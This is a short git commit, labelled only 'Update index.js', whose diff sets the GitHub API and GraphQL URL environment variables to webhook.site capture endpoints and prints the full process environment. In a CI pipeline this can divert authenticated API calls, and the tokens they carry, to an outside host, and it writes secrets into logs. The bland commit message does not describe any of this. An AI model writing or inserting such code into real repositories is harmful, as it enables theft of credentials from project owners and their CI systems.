fad5f940015718041a23875b92673a692bc8c4db
test01 <66986661+testweb01@users.noreply.github.com>
2024-09-21 19:02:28 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,2 +1,4 @@
-// index.js
-console.log(process.env);
+process.env['GITHUB_API_URL']="webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/gitapi"
+
+process.env['GITHUB_GRAPHQL_URL'] = "webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/graphqlapi"
+console.log( process.env );
